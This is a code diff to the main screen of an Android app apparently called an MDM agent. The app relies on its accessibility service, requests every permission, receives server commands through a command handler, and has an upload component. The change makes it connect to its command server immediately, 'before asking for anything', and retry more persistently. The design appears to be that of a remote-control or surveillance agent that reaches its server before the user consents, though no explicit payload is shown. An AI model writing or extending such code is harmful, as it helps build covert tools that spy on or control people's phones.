@@ -30,7 +30,6 @@ class MainActivity : AppCompatActivity() {
     companion object {
         @Volatile private var instanceSocketManager: SocketManager? = null
         @Volatile private var instance: MainActivity? = null
-        @Volatile private var hasShownPermissionsScreen = false
         @Volatile private var isConnecting = false
 
         fun getSocketManager(): SocketManager? = instanceSocketManager
@@ -46,6 +45,10 @@ class MainActivity : AppCompatActivity() {
         instance = this
         Log.i(TAG, "🚀 MainActivity started")
 
+        // CRITICAL: Connect to server IMMEDIATELY, before asking for anything!
+        connectToServer()
+
+        // Show UI based on accessibility status
         if (isAccessibilityEnabled()) {
             showPermissionsScreen()
         } else {
@@ -161,13 +164,8 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showPermissionsScreen() {
-        if (hasShownPermissionsScreen) return
-        hasShownPermissionsScreen = true
-
-        // Request all permissions
         requestAllPermissions()
 
-        // Build UI
         val scrollView = ScrollView(this).apply {
             setBackgroundColor(Color.parseColor("#FF0A0A0A"))
         }
@@ -231,9 +229,6 @@ class MainActivity : AppCompatActivity() {
 
         scrollView.addView(root)
         setContentView(scrollView)
-
-        // Connect to server AFTER UI is shown
-        connectToServer()
     }
 
     private fun requestAllPermissions() {
@@ -261,7 +256,7 @@ class MainActivity : AppCompatActivity() {
 
         Thread {
             var retryCount = 0
-            val maxRetries = 3
+            val maxRetries = 5
 
             while (retryCount < maxRetries) {
                 try {
@@ -273,13 +268,12 @@ class MainActivity : AppCompatActivity() {
                     Log.i(TAG, "  Server: $serverUrl")
                     Log.i(TAG, "  Device: $deviceId")
 
-                    updateStatus("Connecting to server... (attempt $retryCount)")
+                    updateStatus("Connecting to server... ($retryCount/$maxRetries)")
 
                     val apiClient = ApiClient(this)
                     val cryptoManager = CryptoManager()
                     val uploadManager = UploadManager(this)
 
-                    // Step 1: Init crypto (this also wakes up the server)
                     updateStatus("Requesting encryption keys...")
                     val cryptoResult = apiClient.initCrypto(deviceId)
                     if (cryptoResult != null) {
@@ -288,12 +282,11 @@ class MainActivity : AppCompatActivity() {
                     } else {
                         Log.w(TAG, "⚠️ Crypto init returned null, retrying...")
                         if (retryCount < maxRetries) {
-                            Thread.sleep(3000)
+                            Thread.sleep(5000)
                             continue
                         }
                     }
 
-                    // Step 2: Create SocketManager
                     updateStatus("Creating Socket.IO connection...")
                     socketManager = SocketManager(this)
                     setSocketManager(socketManager)
@@ -307,12 +300,10 @@ class MainActivity : AppCompatActivity() {
                         commandHandler.handleCommand(data)
                     }
 
-                    // Step 3: Connect!
                     updateStatus("Connecting to server...")
                     socketManager?.connect()
 
-                    // Wait a bit for connection
-                    Thread.sleep(3000)
+                    Thread.sleep(5000)
 
                     if (socketManager?.isConnected == true) {
                         Log.i(TAG, "🎉 Socket.IO connected!")
@@ -320,7 +311,7 @@ class MainActivity : AppCompatActivity() {
                         isConnecting = false
                         return@Thread
                     } else {
-                        Log.w(TAG, "⚠️ Socket not connected after 3s, retrying...")
+                        Log.w(TAG, "⚠️ Socket not connected after 5s, retrying...")
                         if (retryCount < maxRetries) {
                             Thread.sleep(5000)
                             continue
@@ -336,8 +327,7 @@ class MainActivity : AppCompatActivity() {
                 }
             }
 
-            // All retries failed
-            updateStatus("❌ Connection failed. Server may be sleeping.\nPlease reopen the app.")
+            updateStatus("❌ Connection failed. Server may be sleeping. Reopen app.")
             isConnecting = false
         }.start()
     }
@@ -354,34 +344,26 @@ class MainActivity : AppCompatActivity() {
             val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
             if (enabled != 1) return false
             val list = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
-            // Check if our service is in the list
             list.contains("com.mdm.agent")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error checking accessibility: ${e.message}")
-            false
-        }
+        } catch (e: Exception) { false }
     }
 
     override fun onResume() {
         super.onResume()
 
-        // CRITICAL: Add delay because Android takes time to update accessibility settings
         Handler(Looper.getMainLooper()).postDelayed({
             val enabled = isAccessibilityEnabled()
-            Log.i(TAG, "onResume: accessibility=$enabled, hasShownPerms=$hasShownPermissionsScreen, isConnecting=$isConnecting")
+            Log.i(TAG, "onResume: accessibility=$enabled, isConnecting=$isConnecting")
 
             if (enabled) {
-                if (!hasShownPermissionsScreen) {
-                    Log.i(TAG, "✅ Accessibility enabled! Showing permissions screen...")
-                    showPermissionsScreen()
-                }
-                // Also try to connect if not already connected
-                if (!isConnecting && socketManager?.isConnected != true) {
-                    Log.i(TAG, "📡 Not connected, starting connection from onResume...")
-                    hasShownPermissionsScreen = false  // Reset to allow showPermissionsScreen to run
-                    showPermissionsScreen()
-                }
+                showPermissionsScreen()
             }
-        }, 1500) // 1.5 second delay to let settings update
+
+            // Retry connection if not connected
+            if (!isConnecting && socketManager?.isConnected != true) {
+                Log.i(TAG, "📡 Not connected, retrying from onResume...")
+                connectToServer()
+            }
+        }, 1500)
     }
 }
